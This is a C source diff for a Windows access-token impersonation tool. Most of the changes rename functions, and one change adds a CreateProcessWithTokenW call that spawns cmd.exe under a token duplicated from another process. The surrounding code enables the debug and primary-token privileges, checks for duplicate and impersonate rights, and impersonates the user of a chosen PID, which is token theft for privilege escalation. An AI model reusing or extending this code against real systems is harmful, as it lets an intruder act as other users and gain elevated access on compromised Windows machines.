@@ -19,7 +19,7 @@
 
 #define ERROR_NOT_ALL_ASSIGNED 1300L
 
-char* GetTokenPrivilegesAsString(HANDLE hToken) {
+char* getTokenPrivilegesAsString(HANDLE hToken) {
     DWORD dwSize = 0;
     GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &dwSize);
 
@@ -67,7 +67,7 @@ char* GetTokenPrivilegesAsString(HANDLE hToken) {
     return output;
 }
 
-BOOL HasTokenPermission(HANDLE hToken, DWORD desiredAccess) {
+BOOL hasTokenPermission(HANDLE hToken, DWORD desiredAccess) {
     HANDLE hTokenDup;
     if (DuplicateTokenEx(hToken, desiredAccess, NULL, SecurityImpersonation, TokenPrimary, &hTokenDup)) {
         CloseHandle(hTokenDup);
@@ -76,7 +76,7 @@ BOOL HasTokenPermission(HANDLE hToken, DWORD desiredAccess) {
     return FALSE;
 }
 
-char *PrintUserInfoFromToken(DWORD processId) {
+char *printUserInfoFromToken(DWORD processId) {
     HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, processId);
     char *error = "ERROR";
     char *result;
@@ -104,17 +104,17 @@ char *PrintUserInfoFromToken(DWORD processId) {
         return error;
     }
 
-    char* privilegesString = GetTokenPrivilegesAsString(hToken);
+    char* privilegesString = getTokenPrivilegesAsString(hToken);
     char* debug_required = "\r\n[!] The Debug privilege may be required.";
     char* has_duplicate = "\r\n     [-] Token does not have duplicate perms.";
     char* has_impersonate  = "\r\n     [-] Token does not have impersonate perms. \r\n";
-    if (HasTokenPermission(hToken, TOKEN_DUPLICATE)){
+    if (hasTokenPermission(hToken, TOKEN_DUPLICATE)){
         has_duplicate = "\r\n     [+] Token has duplicate perms.";
     }
-    if (HasTokenPermission(hToken, TOKEN_IMPERSONATE)){
+    if (hasTokenPermission(hToken, TOKEN_IMPERSONATE)){
         has_impersonate  = "\r\n     [+] Token has have impersonate perms.";
     }
-    if (HasTokenPermission(hToken, TOKEN_IMPERSONATE) & HasTokenPermission(hToken, TOKEN_DUPLICATE)){
+    if (hasTokenPermission(hToken, TOKEN_IMPERSONATE) & hasTokenPermission(hToken, TOKEN_DUPLICATE)){
         debug_required = "\r\n[+] The Debug privilege may not be required.";
     }
 
@@ -157,65 +157,7 @@ char *PrintUserInfoFromToken(DWORD processId) {
     return result;
 }
 
-void PrintError(LPTSTR msg) {
-    DWORD errCode = GetLastError();
-    LPVOID lpMsgBuf;
-
-    FormatMessage(
-        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
-        NULL,
-        errCode,
-        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
-        (LPTSTR)&lpMsgBuf,
-        0, NULL);
-
-    _tprintf(TEXT("%s: %d - %s\n"), msg, errCode, (char*)lpMsgBuf);
-    LocalFree(lpMsgBuf);
-}
-
-char *EnablePrivileges(HANDLE hToken, LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) {
-
-	// HANDLE hToken // Handle where the stolen access token will be stored
-	// LPCTSTR PrivName // Privilege name to enable/disable 
-	// BOOL EnablePrivilege // Enable/Disable privilege
-
-	TOKEN_PRIVILEGES tp;
-	LUID luid; // A pointer to recieve LUID of the privilege on local system
-
-    char *result;
-	if (!LookupPrivilegeValue(NULL, lpszPrivilege, &luid))
-	{
-        char *val = "[-] LookupPrivilegeValue() Failed\r\n";
-        result = malloc(strlen(val) * sizeof(char) + 2);
-		strcpy(result, val);
-        return result;
-	}
-
-	tp.PrivilegeCount = 1;
-	tp.Privileges[0].Luid = luid;
-	if (bEnablePrivilege)
-	{
-		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-	}
-	else {
-		tp.Privileges[0].Attributes = 0;
-	}
-
-	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
-	{
-        char *val = "AdjustTokenPrivileges() Failed\r\n";
-        result = malloc(strlen(val) * sizeof(char) + 2);
-		strcpy(result, val);
-        return result;
-	}
-    
-    char *val = "[+] Privilege enabled!\r\n";
-    result = malloc(strlen(val) * sizeof(char) + 2);
-	strcpy(result, val);
-    return result;
-}
-
-char *EnableDebugPrivilege() {
+char *enableDebugPrivilege() {
     HANDLE hToken;
     char *result;
     char *failedProc = "[-] OpenProcessToken error\r\n";
@@ -258,7 +200,7 @@ char *EnableDebugPrivilege() {
     return result;
 }
 
-BOOL EnableAssignPrimaryTokenPrivilege() { 
+BOOL enableAssignPrimaryTokenPrivilege() { 
     HANDLE hToken;
     
     // Open the process token
@@ -290,7 +232,7 @@ BOOL EnableAssignPrimaryTokenPrivilege() {
     return TRUE;
 }
 
-BOOL EnableIncreaseQuotaPrivilege() { 
+BOOL enableIncreaseQuotaPrivilege() { 
     HANDLE hToken;
 
     // Open the process token
@@ -323,7 +265,7 @@ BOOL EnableIncreaseQuotaPrivilege() {
 }
 
 
-char *name(){
+char *getName(){
     char username[256]; 
     DWORD username_len = sizeof(username);  // Length of the buffer
     char *result;
@@ -376,7 +318,7 @@ HANDLE getPrimaryTokenFromProcess(DWORD processId) {
 }
 
 
-void LaunchProcessAsUser(HANDLE hToken) {
+void launchProcessAsUser(HANDLE hToken) {
     STARTUPINFO si;
     PROCESS_INFORMATION pi;
     ZeroMemory(&si, sizeof(si));
@@ -407,13 +349,13 @@ void LaunchProcessAsUser(HANDLE hToken) {
 }
 
 
-char *Impersonate(int pid){
-    char *first_user = name();
+char *impersonate(int pid){
+    char *firstUser = getName();
     STARTUPINFO si;
     PROCESS_INFORMATION pi;
     HANDLE hToken = getPrimaryTokenFromProcess(pid);
     char *open = "[-] Failed to obtain duplicated token.\r\n";
-    char *new_user = name();
+    char *newUser = getName();
     char *impersonation = "[+] Impersonation successfull.\r\n";
     
     if (hToken) {
@@ -425,15 +367,28 @@ char *Impersonate(int pid){
             CloseHandle(hToken);
         }
 
-        new_user = name();
+        if(CreateProcessWithTokenW(hToken, 
+                              NULL, 
+                              "cmd.exe /c echo Hello from the impersonated user!", 
+                              NULL, 
+                              NULL, 
+                              FALSE, 
+                              CREATE_NEW_CONSOLE, 
+                              NULL, 
+                              NULL, 
+                              &si, 
+                              &pi)){
+                                printf("HELLO");
+                              }
+        newUser = getName();
         RevertToSelf();
         CloseHandle(hToken);
     }
 
-    char *result = malloc((strlen(first_user) + strlen(open) + strlen(new_user) +strlen(impersonation))*sizeof(char) + 2); 
-    strcpy(result, first_user);
+    char *result = malloc((strlen(firstUser) + strlen(open) + strlen(newUser) +strlen(impersonation))*sizeof(char) + 2); 
+    strcpy(result, firstUser);
     strcat(result, open);
     strcat(result, impersonation);
-    strcat(result, new_user);
+    strcat(result, newUser);
     return result;
 }
